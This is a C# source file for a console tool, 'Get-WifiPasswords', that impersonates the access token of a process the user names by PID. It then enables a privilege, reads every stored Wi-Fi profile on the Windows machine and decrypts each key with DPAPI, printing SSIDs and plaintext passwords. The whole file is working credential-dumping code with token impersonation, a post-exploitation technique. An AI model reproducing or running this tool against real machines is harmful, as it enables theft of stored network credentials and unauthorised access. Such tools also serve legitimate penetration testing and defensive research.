using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Xml;

namespace Get_WifiPasswords
{
    class Program : TokenImpersonation
    {
        static void Main(string[] args)
        {

            if (args.Length == 0)
            {
                ChangeConsoleColour(2);
                Console.WriteLine(@"Usage: .\Get-WifiPasswords.exe PID");
                ChangeConsoleColour(4);
                Environment.Exit(-1);
            }

            int PID;

            if (int.TryParse(args[0], out PID))
            {
                GetSystemToken(PID);
            }
            else
            {
                ChangeConsoleColour(2);
                Console.WriteLine(@"Usage: .\Get-WifiPasswords.exe PID");
                ChangeConsoleColour(4);
                Environment.Exit(-1);
            }

            ChangeConsoleColour(4);

        }

        public static void GetProfiles()
        {
            List<string> wifiProfiles = new List<string>();

            string interfacePath = Path.GetPathRoot(Environment.SystemDirectory) + @"ProgramData\Microsoft\Wlansvc\Profiles\Interfaces\";

            string[] adapterGUIDs = Directory.GetDirectories(interfacePath);

            foreach (var guid in adapterGUIDs)
            {
                string[] arr = Directory.GetFiles(guid);
                foreach (string i in arr)
                {
                    wifiProfiles.Add(i);
                }
            }

            foreach (string wifiProfile in wifiProfiles)
            {
                GetContents(wifiProfile);
            }
        }

        public static void GetContents(string wifiProfile)
        {
            XmlDocument xml = new XmlDocument();
            xml.Load(wifiProfile);
            XmlNodeList ssid = xml.GetElementsByTagName("name");
            ChangeConsoleColour(1);
            Console.WriteLine("\n[+] SSID: {0}", ssid[0].InnerText);

            XmlNodeList keyMaterial = xml.GetElementsByTagName("keyMaterial");
            try
            {
                Console.WriteLine("[+] Password: {0}", Decrypt(keyMaterial[0].InnerText));
            }
            catch (Exception)
            {
                Console.WriteLine("[+] Open Network - No Key Material Found!");
            }
        }

        public static string Decrypt(string encPassword)
        {
            byte[] passwordBytes = new byte[encPassword.Length / 2];

            for (int i = 0; i < encPassword.Length; i += 2)
                passwordBytes[i / 2] = Convert.ToByte(encPassword.Substring(i, 2), 16);

            byte[] unprotectedBytes = ProtectedData.Unprotect(passwordBytes, null, DataProtectionScope.LocalMachine);

            return Encoding.ASCII.GetString(unprotectedBytes);
        }

        public static void GetSystemToken(int pid)
        {
            ChangeConsoleColour(2);
            Console.WriteLine("\n[+] Attempting to impersonate token of PID: {0}", pid);

            if (!ImpersonateProcessToken(pid))
            {
                ChangeConsoleColour(3);
                Console.WriteLine("[!] Could not impersonate token! Exiting...");
                ChangeConsoleColour(4);
                Environment.Exit(-1);
            }
            else
            {
                Console.WriteLine("[+] Attempting to enable all privileges...");
                if (!EnablePrivilege("SeIncreaseQuotaPrivilege"))
                {
                    ChangeConsoleColour(3);
                    Console.WriteLine("[!] Could not enable all privileges! Exiting...");
                    ChangeConsoleColour(4);
                    Environment.Exit(-1);
                }
                else
                {
                    Console.WriteLine("[+] Attempting to dump wifi credentials...");
                    GetProfiles();
                }
            }

        }

        public static void ChangeConsoleColour(int statusCode)
        {
            switch (statusCode)
            {
                case 1:
                    Console.ForegroundColor = ConsoleColor.Green;
                    break;
                case 2:
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    break;
                case 3:
                    Console.ForegroundColor = ConsoleColor.Red;
                    break;
                case 4:
                    Console.ForegroundColor = ConsoleColor.White;
                    break;

            }
        }

    }
}

